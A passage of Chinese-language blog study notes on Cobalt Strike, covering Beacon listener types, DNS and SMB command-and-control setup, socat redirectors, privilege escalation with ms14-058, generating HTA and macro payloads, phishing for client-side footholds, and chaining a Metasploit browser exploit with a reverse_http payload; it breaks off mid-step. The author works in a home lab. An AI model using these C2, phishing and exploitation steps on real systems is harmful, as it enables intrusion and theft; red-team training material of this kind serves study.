Strike有两种类型的监听器：</p><ul><li><p>Beacon</p><p>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，笔者个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如：</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_http&#x2F;reverse_http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>Foreign</p><p>Foreign直译就是外部的，这里可以理解成<code>对外监听器</code>，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，笔者个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;foreign&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="2、HTTP-和-HTTPS-Beacon"><a href="#2、HTTP-和-HTTPS-Beacon" class="headerlink" title="2、HTTP 和 HTTPS Beacon"></a>2、HTTP 和 HTTPS Beacon</h2><p><strong>Beacon是什么</strong></p><ul><li>Beacon是CS的Payload</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li><li>Beacon有很多的后渗透攻击模块和远程管理工具</li></ul><p><strong>Beacon的类型</strong></p><ul><li><p>HTTP 和 HTTPS Beacon</p><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_http&#x2F;reverse_httpwindows&#x2F;beacon_https&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>DNS Beacon</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_dns&#x2F;reverse_dns_txtwindows&#x2F;beacon_dns&#x2F;reverse_http<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>SMB Beacon</p><p>SMB Beacon也可以叫做pipe beacon</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_smb&#x2F;bind_pipe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><strong>创建一个HTTP Beacon</strong></p><p>点击 Cobalt Strike  –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>复制弹窗的命令，放到靶机中运行</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时，回到CS，就可以看到已经靶机上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>HTTPS Beacon</strong></p><p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h2 id="3、DNS-Beacon"><a href="#3、DNS-Beacon" class="headerlink" title="3、DNS Beacon"></a>3、DNS Beacon</h2><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p><blockquote><p>以上内容摘自 A-TEAM 团队的 CS 4.0 用户手册</p></blockquote><p>DNS Beacon的工作流程具体如下：</p><p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p><p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p><p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon什么的会更慢。</p><p><strong>域名配置</strong></p><p>既然是配置域名，所以就需要先有个域名，这里就用我的博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>根据上一章的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>然后经过一段时间的等待，就可以发现已经上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、SMB-Beacon"><a href="#4、SMB-Beacon" class="headerlink" title="4、SMB Beacon"></a>4、SMB Beacon</h2><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><p><strong>SMB Beacon 配置</strong></p><p>首先需要一个上线的主机，这里我使用的HTTP Beacon，具体如何上线，可以参考之前第5节《如何建立Payload处理器》学习笔记中的内容，这里不过多赘述。</p><p>主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来在Beacon中直接输入<code>spawn SMB</code>，这里的<code>SMB</code>指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个<code>∞∞</code>字符。</p><p>接下来我这里将SMB Beacon插入到进程中，以vmtoolsed进程为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在vmtoolsed中插入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。</p><p>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在CS中，如果获取到目标的管理员权限，在用户名后会有<code>*</code>号标注，通过这个区别，可以判断出当前上线的test用户为普通权限用户，因此这里给他提升一下权限。</p><p><strong>提权</strong></p><blockquote><p>由于下面与上面内容的笔记不是在同一天写的，因此截图中上线的主机会有所差异，这里主要是记录使用的方法。</p></blockquote><p>由于CS自带的提权方式较少，因此这里就先加载一些网上的提权脚本，脚本下载地址为：<a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p><p>下载之后，打开<code>Cobalt Strike --&gt; Script Manager</code> ，之后点击<code>Load</code>，选择自己刚才下载的文件中的<code>elevate.cna</code>文件。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接着选择要提权的主机，右击选择<code>Access --&gt; Elevate</code>，Listener中选择刚才新建的SMB Beacon，这里的Exploit选择了ms14-058，如果使用ms14-058不能提权，就换一个Exploit进行尝试。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>顺利的情况下，就可以看到提权后的管理员权限会话了，在管理员权限的会话中，不光用户名后有个*号，其Logo也是和其他会话不同的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>连接与断开</strong></p><p>此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入<code>unlink 192.168.175.144</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果想再次连上，就直接输入<code>link 192.168.175.144</code>，想从当前主机连到其他主机也可以使用此命令。</p><h2 id="5、重定向器"><a href="#5、重定向器" class="headerlink" title="5、重定向器"></a>5、重定向器</h2><p>重定向器<code>Redirectors</code>是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。</p><pre class="line-numbers language-none"><code class="language-none">目标靶机 &lt;--------&gt;多个并列的重定向器&lt;------&gt;CS服务器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p><ul><li>保护自己的CS服务器，避免目标发现自己的真实IP</li><li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li></ul><p><strong>创建一个重定向器</strong></p><p>这里就使用自己的内网环境作为测试了，首先理清自己的IP</p><p>CS服务器IP：192.168.175.129</p><p>目标靶机IP：192.168.175.130</p><p>重定向器IP：192.168.175.132、192.168.175.133</p><p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:192.168.175.129:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时可以测试一下重定向器是否正常工作，在CS中打开 View –&gt; Web Log，之后浏览器访问CS服务器地址，也就是这里的192.168.175.129</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到CS是能够正常接收到流量的，说明重定向器已经配置OK了，此时按照上面创建一个HTTP Beacon的操作，创建一个HTTP Beacon，并在靶机中运行</p><p>当靶机上线的时候，观察靶机中的流量，可以看到与靶机连接的也是重定向器的IP</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在CS中也可以看到上线主机的外部IP也是重定向器的IP，此时如果关闭一个重定向器，系统依旧可以正常工作。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>由于笔者在学习CS过程中，所看的教程使用的是3.x版本的CS，而我使用的是4.0版本的CS。因此域名配置实操部分是自己参考网上大量文章后自己多次尝试后的结果，所以难免出现错误之处，要是表哥发现文中错误的地方，欢迎留言指正。</p><h2 id="6、攻击载荷安全特性"><a href="#6、攻击载荷安全特性" class="headerlink" title="6、攻击载荷安全特性"></a>6、攻击载荷安全特性</h2><p>1、在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。</p><p>2、在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。</p><p>3、当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。</p><p>4、值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。</p><h1 id="0x03-目标攻击"><a href="#0x03-目标攻击" class="headerlink" title="0x03 目标攻击"></a>0x03 目标攻击</h1><h2 id="1、客户端攻击"><a href="#1、客户端攻击" class="headerlink" title="1、客户端攻击"></a>1、客户端攻击</h2><p><strong>什么是客户端攻击</strong></p><p>客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。</p><p><code>原文：A client-side attack is an attack against an application used to view attacker controlled content.</code></p><p><strong>为什么要进行客户端攻击</strong></p><p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p><p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点<code>foothold</code>。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p><p><strong>如何获得客户端上的立足点</strong></p><p>1、尽可能多的了解目标环境，即做好信息收集工作</p><p>2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致</p><p>3、攻击刚刚创建的虚拟机，这会是最好的攻击目标</p><p>4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果</p><p>5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件</p><p>如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。</p><h2 id="2、系统侦察"><a href="#2、系统侦察" class="headerlink" title="2、系统侦察"></a>2、系统侦察</h2><p>系统侦察<code>System Profiler</code>是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p><p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择<code>System Profiler</code>功能模块，配置待跳转的URL等信息即可。</p><p>如果勾选了<code>Use Java Applet to get information</code>则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><pre class="line-numbers language-none"><code class="language-none">1、View --&gt; Applications2、View --&gt; Web Log3、Cobalt Strike --&gt; Visualization --&gt; Target Table<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h2 id="3、Cobalt-Strike-的攻击方式"><a href="#3、Cobalt-Strike-的攻击方式" class="headerlink" title="3、Cobalt Strike 的攻击方式"></a>3、Cobalt Strike 的攻击方式</h2><p><strong>用户驱动攻击</strong></p><p>用户驱动攻击<code>User-Driven Attacks</code>需要欺骗用户产生交互才行，但也有许多的优点。</p><p>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p><p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p><h3 id="用户驱动攻击包"><a href="#用户驱动攻击包" class="headerlink" title="用户驱动攻击包"></a>用户驱动攻击包</h3><p>用户驱动攻击包<code>User-Driven Attacks Packages</code>功能打开位置：<code>Attacks --&gt; Packages</code></p><p><strong>1、HTML应用</strong></p><p>HTML应用<code>HTML Application</code>生成(executable/VBA/powershell)这3种原理不同的VBScript实现的<code>evil.hta</code>文件。</p><p><strong>2、Microsoft Office 宏文件</strong></p><p>Microsoft Office 宏文件<code>Microsoft Office Document Macros</code>可以生成恶意宏放入office文件，非常经典的攻击手法。</p><p><strong>3、Payload 生成器</strong></p><p>Payload生成器<code>Payload Generator</code>可以生成各种语言版本的Payload，便于进行免杀。</p><p><strong>4、Windows 可执行文件</strong></p><p>Windows 可执行文件<code>Windows Executable</code> 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p><p><strong>5、Windows 可执行文件（Stageless）</strong></p><p>Windows 可执行文件（Stageless）<code>Windows Executable (Stageless)</code>会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p><h3 id="用户驱动的Web交付攻击"><a href="#用户驱动的Web交付攻击" class="headerlink" title="用户驱动的Web交付攻击"></a>用户驱动的Web交付攻击</h3><p>用户驱动Web交付攻击<code>User-Driven Web Drive-by Attacks</code>功能打开位置：<code>Attacks --&gt; Web Drive-by</code></p><p><strong>1、java 签名 applet 攻击</strong></p><p>java 签名 applet 攻击<code>Java Signed Applet Attack</code>会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</p><p><strong>2、Java 智能 Applet 攻击</strong></p><p>Java 智能 Applet 攻击<code>Java Smart Applet Attack</code>会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</p><p><strong>3、脚本化 Web 交付</strong></p><p>脚本化 Web 交付<code>Scripted Web Delivery</code> 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</p><p><strong>4、托管文件</strong></p><p>托管文件<code>Host File</code>通过<code>Attacks --&gt; Web Drive-by --&gt; Host File</code>进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。</p><p>如果想删除上传到CS服务端上的文件，可以到<code>Attacks --&gt; Web Drive-by --&gt; Manage</code>下进行删除。</p><p>如果想查看谁访问了这些文件，可以到<code>View --&gt; Web Log</code>下进行查看。</p><h2 id="4、开始攻击"><a href="#4、开始攻击" class="headerlink" title="4、开始攻击"></a>4、开始攻击</h2><h3 id="HTML-应用攻击"><a href="#HTML-应用攻击" class="headerlink" title="HTML 应用攻击"></a>HTML 应用攻击</h3><p>首先来到<code>Attacks --&gt; Packages --&gt; HTML Application</code>创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>HTML应用文件生成好后，来到<code>Attacks --&gt; Web Drive-by --&gt; Host File</code>，选择刚才生成的文件，最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当在目标主机上提示是否运行时，点击运行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="MSF-与-CS-的结合利用"><a href="#MSF-与-CS-的结合利用" class="headerlink" title="MSF 与 CS 的结合利用"></a>MSF 与 CS 的结合利用</h3><p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p><p>1、首先在MSF上选择攻击模块</p><p>2、接着在MSF上设置Payload为<code>windows/meterpreter/reverse_http</code>或者<code>windows/meterpreter/reverse_https</code>，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。</p><p>3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。</p><p>4、然后设置 <code>DisablePayloadHandler</code> 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。</p><p>5、再设置 <code>PrependMigrate</code> 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p><p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行。</p><p><strong>操作</strong></p><p>在CS中新建一个HTTP Beacon，创建过程不再赘述。</p><p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;browser&#x2F;adobe_flash_hacking_team_uaf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、接着配置payload，这里选择revese_http payload</p><pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;revese_httpset LHOST cs_server_ipset LPORT 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 